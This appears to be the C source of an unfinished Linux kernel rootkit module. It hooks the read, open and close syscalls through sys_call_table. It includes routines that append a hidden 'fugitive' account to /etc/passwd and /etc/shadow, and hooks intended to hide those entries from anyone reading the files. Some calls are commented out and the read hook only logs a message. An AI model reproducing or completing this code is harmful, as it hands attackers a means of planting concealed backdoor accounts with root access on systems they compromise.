#include "evil-account.h"
#include "account-details.h"
#include "hijack-syscall.h"

// #define TEST "/home/jml/rootkit/test.txt"

static int has_fug(char *, char *);
static ssize_t append_to_file(char *, char *);

int __init temp_init(void){
    printk("enter kernel module\n");
    // import_fugitive();
    // hide_fugitive();
    HOOK_SYSCALL(sys_call_table, good_read, erase_time, __NR_read);
    return 0;
}

void __exit temp_exit(void){
    printk("exit kernel module\n");
    // show_fugitive();
    UNHOOK_SYSCALL(sys_call_table, good_read, __NR_read);
    return;
}

int import_fugitive(){
    if(has_fug(PASSWD_PATH, PASSWD_GEN()))
        append_to_file(PASSWD_PATH, PASSWD_GEN());
    if(has_fug(SHADOW_PATH, SHADOW_GEN()))
        append_to_file(SHADOW_PATH, SHADOW_GEN());
    return 0;
}

int hide_fugitive(){
    sys_call_table = (unsigned long **) kallsyms_lookup_name("sys_call_table");
    HOOK_SYSCALL(sys_call_table, good_open, king_crimson, __NR_open);
    HOOK_SYSCALL(sys_call_table, good_close, this_is_requiem, __NR_close);
    return 0;
}

int show_fugitive(){
    UNHOOK_SYSCALL(sys_call_table, good_open, __NR_open);
    UNHOOK_SYSCALL(sys_call_table, good_close, __NR_close);
    return 0;
}

/* append "fug" to the end of "file_path" */
ssize_t append_to_file(char *file_path, char *fug){
    struct file *f;
    loff_t offset = 0;
    ssize_t ret;

    f = filp_open(file_path, O_WRONLY, ~O_CREAT);
    if(f == NULL)
        return ENOENT;

    offset = vfs_llseek(f, offset, SEEK_END);
    ret = kernel_write(f, fug, strlen(fug), &offset);
    filp_close(f,NULL);
    return ret;
}

/* return 0 if "file_path" has line "fug" */
int has_fug(char *file_path, char *fug){
    struct file *f;
    loff_t offset;
    loff_t line_start;
    char *line_str;
    char c;

    f = filp_open(file_path, O_RDONLY, ~O_CREAT);
    line_start = offset = 0;

    if(f == NULL)
        return ENOENT;

    /* read f char by char up to '\n', then
     * compare entire line to "fug"
     */
    while(kernel_read(f, &c, sizeof(char), &offset)){
        if(c == '\n'){
            line_str = kcalloc(offset-line_start+1, sizeof(char), GFP_KERNEL);
            kernel_read(f, line_str, offset-line_start, &line_start);
            if(!strcmp(line_str, fug)){
                kfree(line_str);
                return 0;
            }
            kfree(line_str);
            line_start = offset;
        }
    }
    // did not find fugitive
    return -1;
}


asmlinkage int king_crimson(char *pathname, int flags, mode_t mode){
    erased &= strcmp(PASSWD_PATH, pathname);
    erased &= strcmp(SHADOW_PATH, pathname);
    if(!erased){
        printk("need to hide file %s\n", pathname);
        // HOOK_SYSCALL(sys_call_table, good_read, erase_time, __NR_read);
    }
    return (*good_open)(pathname, flags, mode);
}

asmlinkage ssize_t erase_time(int fd, void *buf, size_t count){
    ssize_t ret;
    ret = (*good_read)(fd, buf, count);

    // if()
    printk("the power of king crimson!\n");
    return ret;
}

asmlinkage int this_is_requiem(int fd){
    if(!erased){
        printk("return hide file\n");
        // UNHOOK_SYSCALL(sys_call_table, good_read, __NR_read);
        erased = 1;
    }
    return (*good_close)(fd);
}
